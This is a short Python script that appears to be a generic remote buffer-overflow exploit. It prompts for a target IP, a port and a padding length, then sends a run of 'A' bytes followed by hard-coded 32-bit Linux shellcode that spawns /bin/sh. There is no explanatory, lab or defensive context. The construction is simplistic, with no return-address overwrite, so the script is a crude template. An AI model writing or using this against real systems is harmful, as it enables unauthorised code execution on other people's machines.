import socket

tip = input("Enter the IP (Local or Public) (*): ")
tpo = int(input("Enter the port (*): "))
ovqus = int(input("Amount of the buffer overflow bytes (*): "))

shellcode = (
    b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"
    b"\x89\xe3\x50\x53\x89\xe1\xb0\x0b\x50\xcd\x80"
)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((tip, tpo))

payload = b"A" * ovqus + shellcode
sock.send(payload)
sock.close()
